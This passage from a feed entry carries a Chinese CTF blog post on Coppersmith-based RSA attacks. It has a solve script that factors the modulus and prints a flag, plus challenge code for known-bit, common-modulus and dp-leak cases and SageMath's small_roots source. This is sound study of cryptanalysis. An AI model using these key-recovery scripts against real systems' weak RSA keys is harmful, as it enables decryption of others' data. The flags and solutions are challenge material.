= hint1*(<span class="number">2</span>^<span class="number">724</span>) + out[<span class="number">0</span>]*(<span class="number">2</span>^<span class="number">265</span>)*<span class="number">64</span> + <span class="number">19</span>*(<span class="number">2</span>^<span class="number">265</span>) +h_low</span><br><span class="line">q = n//<span class="built_in">int</span>(p)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(ct,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">7914249681483699348105896117503653090559709096541336321100288778319519769467957659191305141838207370902177955576606946702942703171837148</span></span><br><span class="line"><span class="string">19</span></span><br><span class="line"><span class="string">b&#x27;flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="题型3_已知低位"><a class="markdownIt-Anchor" href="#题型3_已知低位"></a> 题型3_已知低位</h1><h2 id="题目1_已知d的低位"><a class="markdownIt-Anchor" href="#题目1_已知d的低位"></a> 题目1_已知d的低位</h2><ul><li><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130171830">d低位攻击 &amp; d高位攻击-CSDN博客</a></li></ul><h2 id="题目2_已知dp的低位"><a class="markdownIt-Anchor" href="#题目2_已知dp的低位"></a> 题目2_已知dp的低位</h2><h2 id="题目3_已知dp的高位"><a class="markdownIt-Anchor" href="#题目3_已知dp的高位"></a> 题目3_已知dp的高位</h2><h1 id="题型4_灵活构造方程"><a class="markdownIt-Anchor" href="#题型4_灵活构造方程"></a> 题型4_灵活构造方程</h1><ul><li>有的时候<code>coppersmith</code>攻击的方程不是很好找到，需要进行构造，需要掌握并熟练运用<strong>转换与化归</strong>这一数学思想。还需要比较多的定理和技巧作为辅助操作。</li><li>接下来就写几个例题，找一找感觉。心里的一点想法：<strong>对数学的热爱并不是单纯的热爱，而是比较功利性的热爱，初中的数学考试成绩使得我陷入了幻想，并对数学产生了带有功利性的兴趣。但是这样的兴趣必然会在一次次数学考试分数不高之后被磨灭。并且自己也没有花太多时间探索数学，导致一些思维能力也没培养上来，到了高中由于时间紧，对数学的探索就更少了，所以到大学对数学就没太大兴趣。其实初一的时候，我爸妈想给我买数学练习，结果买回来的是初一奥数，从里面我就了解到了同余(实际上我直接把同余当做了恒等符号)。对于这本书也只是翻一翻，看看题目解析，对每一题实际上并没有动手去算、没有探索，也没有每周花一天去死磕一题（周末经常在玩中内耗,也没通过电脑了解更多东西），当时甚至连那边出现的平方差公式都不认识（人教版初中教材初二才教平方差公式）所以初高中过得比较平凡(和大部分人一样)</strong></li><li>回归正题，就介绍一下这种题型。</li></ul><h2 id="题目1_共模攻击构造"><a class="markdownIt-Anchor" href="#题目1_共模攻击构造"></a> 题目1_共模攻击构造</h2><ul><li>题目来源：[<a href="https://www.nssctf.cn/problem/414">SWPUCTF 2021 新生赛]crypto3 | NSSCTF</a></li><li>当然这种题型还有另外一种不使用构造方程用<code>Coppersmith</code>打，也可以使用同余加上费马小定理解决，这个解法后面也会给出推导</li><li>题目如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;******************&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,p,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,q,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857</span></span><br><span class="line"><span class="comment">#flag2= 95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954</span></span><br><span class="line"><span class="comment">#n= 140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971</span></span><br></pre></td></tr></table></figure><ul><li>这题表面上看是一个共模攻击，但是附件中并没有给加密指数<code>p</code>、<code>q</code>这时共模攻击的方法就无法使用了。此时我们就要走别的路子了。</li></ul><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="题目1_dp泄露通解"><a class="markdownIt-Anchor" href="#题目1_dp泄露通解"></a> 题目1_dp泄露通解</h2><ul><li><p><a href="https://tover.xyz/p/2024-HSCTF-babyDP/">RSA中dp泄露的广义解法 | Tover’s Blog</a></p></li><li><p>题目的代码如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">bits = <span class="number">1024</span></span><br><span class="line">p, q = [random_prime(<span class="number">2</span>^bits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">2</span>*<span class="number">10</span>^<span class="number">76</span>-<span class="number">3</span></span><br><span class="line">d = e.inverse_mod((p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e  = %d&#x27;</span> % e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n  = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dp = %d&#x27;</span> % dp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c  = %d&#x27;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e  = 19999999999999999999999999999999999999999999999999999999999999999999999999997</span></span><br><span class="line"><span class="string">n  = 7195506839435218889565105541674965483194164483027741709706696451513641438345177472634371310250998546706062462270851552911697354605048972081656931006641878545036542923897114647393564522132057589249800431430995780074871171268958056358251827104531889348948541240686274977093185746573748206617663459128090693743840574459752890533065398493485714768878646999590143805843490432318539260302521682823958290340460403361801534822098048095280034600065200137857346827560676300256938953222718633375808719441534702981763523406056651752914141143665893462943582116716812913462656214604870428310720751101481210148746546806273965485289</span></span><br><span class="line"><span class="string">dp = 34961801811050613471700883525108632060492526395401334090302835931304663757529660746363964830407055340550990256271716811099606849841913560556222756478612800702209651907866303152581107449312861896692310607989826809665245295483724533775337076019316812377921373194504440845718347150919782506437242366281376701299</span></span><br><span class="line"><span class="string">c  = 3014636373048664939954772778404195986026862165799593915685719641505606570670923436003664110094703916031096486273947905494103538805486521321522443488182065845367347589071783679908494724693530639371358965655992560909299314626568439587755874253430614726720724608456333450258184012429367293386944954388615812902809362326474915645899324083994448117282677622943580354006160302366855350193039875335543211982510928721395526768129547143054319585071252781483346116972611571317425047748862917945459911485505200762492537496489429730213393936533514665994680707861503489288913062785427211743828345144957201996243444547648085230048</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目2_d比较小_boneh_and_durfee_attack"><a class="markdownIt-Anchor" href="#题目2_d比较小_boneh_and_durfee_attack"></a> 题目2_d比较小_Boneh_and_Durfee_attack</h2><ul><li>d比较小的话是有两种攻击方法的，<strong>Boneh and Durfee attack</strong>这种攻击方式就是使用的<code>Coppersmith</code>方法。</li><li>d比较小还有一种攻击方式就是<strong>维纳攻击</strong>，这两个攻击都是已知d，且d比较小。</li><li>当时使用<strong>Boneh and Durfee attack</strong>会比较好一点，因为此时d满足的范围会更大，但是<strong>Boneh and Durfee attack</strong>攻击的代码比较难实现（虽然可以直接套轮子）。如下图所示：</li></ul><p><img src="/2025/03/29/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E4%B9%8BCoppersmith%E6%94%BB%E5%87%BB/image-20250514180905850.png" alt="image-20250514180905850"></p><ul><li>而维纳攻击的条件如下：</li></ul><p><img src="/2025/03/29/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E4%B9%8BCoppersmith%E6%94%BB%E5%87%BB/image-20250514180934745.png" alt="image-20250514180934745"></p><h1 id="small_roots函数源码"><a class="markdownIt-Anchor" href="#small_roots函数源码"></a> small_roots函数源码</h1><ul><li>函数源码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">self, X=<span class="literal">None</span>, beta=<span class="number">1.0</span>, epsilon=<span class="literal">None</span>, **kwds</span>):</span><br><span class="line">    <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Let `N` be the characteristic of the base ring this polynomial</span></span><br><span class="line"><span class="string">    is defined over: ``N = self.base_ring().characteristic()``.</span></span><br><span class="line"><span class="string">    This method returns small roots of this polynomial modulo some</span></span><br><span class="line"><span class="string">    factor `b` of `N` with the constraint that `b &gt;= N^\beta`.</span></span><br><span class="line"><span class="string">    Small in this context means that if `x` is a root of `f`</span></span><br><span class="line"><span class="string">    modulo `b` then `|x| &lt; X`. This `X` is either provided by the</span></span><br><span class="line"><span class="string">    user or the maximum `X` is chosen such that this algorithm</span></span><br><span class="line"><span class="string">    terminates in polynomial time. If `X` is chosen automatically</span></span><br><span class="line"><span class="string">    it is `X = ceil(1/2 N^&#123;\beta^2/\delta - \epsilon&#125;)`.</span></span><br><span class="line"><span class="string">    The algorithm may also return some roots which are larger than `X`.</span></span><br><span class="line"><span class="string">    &#x27;This algorithm&#x27; in this context means Coppersmith&#x27;s algorithm for finding</span></span><br><span class="line"><span class="string">    small roots using the LLL algorithm. The implementation of this algorithm</span></span><br><span class="line"><span class="string">    follows Alexander May&#x27;s PhD thesis referenced below.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    - ``X`` -- an absolute bound for the root (default: see above)</span></span><br><span class="line"><span class="string">    - ``beta`` -- compute a root mod `b` where `b` is a factor of `N` and `b</span></span><br><span class="line"><span class="string">      \ge N^\beta`. (Default: 1.0, so `b = N`.)</span></span><br><span class="line"><span class="string">    - ``epsilon`` -- the parameter `\epsilon` described above. (Default: `\beta/8`)</span></span><br><span class="line"><span class="string">    - ``**kwds`` -- passed through to method :meth:`Matrix_integer_dense.LLL() &lt;sage.matrix.matrix_integer_dense.Matrix_integer_dense.LLL&gt;`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    EXAMPLES:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    First consider a small example::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: N = 10001</span></span><br><span class="line"><span class="string">        sage: K = Zmod(10001)</span></span><br><span class="line"><span class="string">        sage: P.&lt;x&gt; = PolynomialRing(K, implementation=&#x27;NTL&#x27;)</span></span><br><span class="line"><span class="string">        sage: f = x^3 + 10*x^2 + 5000*x - 222</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This polynomial has no roots without modular reduction (i.e. over `\ZZ`)::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: f.change_ring(ZZ).roots()</span></span><br><span class="line"><span class="string">        []</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    To compute its roots we need to factor the modulus `N` and use the Chinese</span></span><br><span class="line"><span class="string">    remainder theorem::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: p, q = N.prime_divisors()</span></span><br><span class="line"><span class="string">        sage: f.change_ring(GF(p)).roots()</span></span><br><span class="line"><span class="string">        [(4, 1)]</span></span><br><span class="line"><span class="string">        sage: f.change_ring(GF(q)).roots()</span></span><br><span class="line"><span class="string">        [(4, 1)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: crt(4, 4, p, q)</span></span><br><span class="line"><span class="string">        4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This root is quite small compared to `N`, so we can attempt to</span></span><br><span class="line"><span class="string">    recover it without factoring `N` using Coppersmith&#x27;s small root</span></span><br><span class="line"><span class="string">    method::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: f.small_roots()</span></span><br><span class="line"><span class="string">        [4]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    An application of this method is to consider RSA. We are using 512-bit RSA</span></span><br><span class="line"><span class="string">    with public exponent `e=3` to encrypt a 56-bit DES key. Because it would be</span></span><br><span class="line"><span class="string">    easy to attack this setting if no padding was used we pad the key `K` with</span></span><br><span class="line"><span class="string">    1s to get a large number::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: Nbits, Kbits = 512, 56</span></span><br><span class="line"><span class="string">        sage: e = 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    We choose two primes of size 256-bit each::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: p = 2^256 + 2^8 + 2^5 + 2^3 + 1</span></span><br><span class="line"><span class="string">        sage: q = 2^256 + 2^8 + 2^5 + 2^3 + 2^2 + 1</span></span><br><span class="line"><span class="string">        sage: N = p*q</span></span><br><span class="line"><span class="string">        sage: ZmodN = Zmod( N )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    We choose a random key::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: K = ZZ.random_element(0, 2^Kbits)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    and pad it with `512-56=456` 1s::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: Kdigits = K.digits(2)</span></span><br><span class="line"><span class="string">        sage: M = [0]*Kbits + [1]*(Nbits-Kbits)</span></span><br><span class="line"><span class="string">        sage: for i in range(len(Kdigits)): M[i] = Kdigits[i]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: M = ZZ(M, 2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Now we encrypt the resulting message::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: C = ZmodN(M)^e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    To recover `K` we consider the following polynomial modulo `N`::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: P.&lt;x&gt; = PolynomialRing(ZmodN, implementation=&#x27;NTL&#x27;)</span></span><br><span class="line"><span class="string">        sage: f = (2^Nbits - 2^Kbits + x)^e - C</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    and recover its small roots::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: Kbar = f.small_roots()[0]</span></span><br><span class="line"><span class="string">        sage: K == Kbar</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The same algorithm can be used to factor `N = pq` if partial</span></span><br><span class="line"><span class="string">    knowledge about `q` is available. This example is from the</span></span><br><span class="line"><span class="string">    Magma handbook:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    First, we set up `p`, `q` and `N`::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: length = 512</span></span><br><span class="line"><span class="string">        sage: hidden = 110</span></span><br><span class="line"><span class="string">        sage: p = next_prime(2^int(round(length/2)))</span></span><br><span class="line"><span class="string">        sage: q = next_prime(round(pi.n()*p))                                           # needs sage.symbolic</span></span><br><span class="line"><span class="string">        sage: N = p*q                                                                   # needs sage.symbolic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Now we disturb the low 110 bits of `q`::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: qbar = q + ZZ.random_element(0, 2^hidden - 1)                             # needs sage.symbolic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    And try to recover `q` from it::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: F.&lt;x&gt; = PolynomialRing(Zmod(N), implementation=&#x27;NTL&#x27;)                     # needs sage.symbolic</span></span><br><span class="line"><span class="string">        sage: f = x - qbar                                                              # needs sage.symbolic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    We know that the error is `\le 2^&#123;\text&#123;hidden&#125;&#125;-1` and that the modulus</span></span><br><span class="line"><span class="string">    we are looking for is `\ge \sqrt&#123;N&#125;`::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sage: from sage.misc.verbose import set_verbose</span></span><br><span class="line"><span class="string">        sage: set_verbose(2)</span></span><br><span class="line"><span class="string">        sage: d = f.small_roots(X=2^hidden-1, beta=0.5)[0]  # time random               # needs sage.symbolic</span></span><br><span class="line"><span class="string">        verbose 2 (&lt;module&gt;) m = 4</span></span><br><span class="line"><span class="string">        verbose 2 (&lt;module&gt;) t = 4</span></span><br><span class="line"><span class="string">        verbose 2 (&lt;module&gt;) X = 1298074214633706907132624082305023</span></span><br><span class="line"><span class="string">        verbose 1 (&lt;module&gt;) LLL of 8x8 matrix (algorithm fpLLL:wrapper)</span></span><br><span class="line"><span class="string">        verbose 1 (&lt;module&gt;) LLL finished (time = 0.006998)</span></span><br><span class="line"><span class="string">        sage: q == qbar - d                                                             # needs sage.symbolic</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    REFERENCES:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Don Coppersmith. *Finding a small root of a univariate modular equation.*</span></span><br><span class="line"><span class="string">    In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture</span></span><br><span class="line"><span class="string">    Notes in Computer Science, p. 155--165. Springer, 1996.</span></span><br><span class="line"><span class="string">    http://cr.yp.to/bib/2001/coppersmith.pdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Alexander May. *New RSA Vulnerabilities Using Lattice Reduction Methods.*</span></span><br><span class="line"><span class="string">    PhD thesis, University of Paderborn, 2003.</span></span><br><span class="line"><span class="string">    http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> sage.misc.verbose <span class="keyword">import</span> verbose</span><br><span class="line">    <span class="keyword">from</span> sage.matrix.constructor <span class="keyword">import</span> Matrix</span><br><span class="line">    <span class="keyword">from</span> sage.rings.real_mpfr <span class="keyword">import</span> RR</span><br><span class="line"></span><br><span class="line">    N = self.parent().characteristic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">&quot;Polynomial must be monic.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    beta = RR(beta)</span><br><span class="line">    <span class="keyword">if</span> beta &lt;= <span class="number">0.0</span> <span class="keyword">or</span> beta &gt; <span class="number">1.0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;0.0 &lt; beta &lt;= 1.0 not satisfied.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f = self.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    P,(x,) = f.parent().objgens()</span><br><span class="line"></span><br><span class="line">    delta = f.degree()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> epsilon <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        epsilon = beta/<span class="number">8</span></span><br><span class="line">    verbose(<span class="string">&quot;epsilon = %f&quot;</span>%epsilon, level=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">max</span>(beta**<span class="number">2</span>/(delta * epsilon), <span class="number">7</span>*beta/delta).ceil()</span><br><span class="line">    verbose(<span class="string">&quot;m = %d&quot;</span>%m, level=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    t = <span class="built_in">int</span>( ( delta*m*(<span class="number">1</span>/beta -<span class="number">1</span>) ).floor() )</span><br><span class="line">    verbose(<span class="string">&quot;t = %d&quot;</span>%t, level=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> X <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        X = (<span class="number">0.5</span> * N**(beta**<span class="number">2</span>/delta - epsilon)).ceil()</span><br><span class="line">    verbose(<span class="string">&quot;X = %s&quot;</span>%X, level=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we could do this much faster, but this is a cheap step</span></span><br><span class="line">    <span class="comment"># compared to LLL</span></span><br><span class="line">    g  = [x**j * N**(m-i) * f**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(delta) ]</span><br><span class="line">    g.extend([x**i * f**m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)]) <span class="comment"># h</span></span><br><span class="line"></span><br><span class="line">    B = Matrix(ZZ, <span class="built_in">len</span>(g), delta*m + <span class="built_in">max</span>(delta,t) )</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B.nrows()):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>( g[i].degree()+<span class="number">1</span> ):</span><br><span class="line">            B[i,j] = g[i][j]*X**j</span><br><span class="line"></span><br><span class="line">    B =  B.LLL(**kwds)</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">sum</span>([ZZ(B[<span class="number">0</span>,i]//X**i)*x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B.ncols())])</span><br><span class="line">    R = f.roots()</span><br><span class="line"></span><br><span class="line">    ZmodN = self.base_ring()</span><br><span class="line">    roots = <span class="built_in">set</span>([ZmodN(r) <span class="keyword">for</span> r,m <span class="keyword">in</span> R <span class="keyword">if</span> <span class="built_in">abs</span>(r) &lt;= X])</span><br><span class="line">    Nbeta = N**beta</span><br><span class="line">    <span class="keyword">return</span> [root <span class="keyword">for</span> root <span class="keyword">in</span> roots <span class="keyword">if</span> N.gcd(ZZ(self(root))) &gt;= Nbeta]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：堆累了，学点模版密码</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆IO_FILE基础</title>
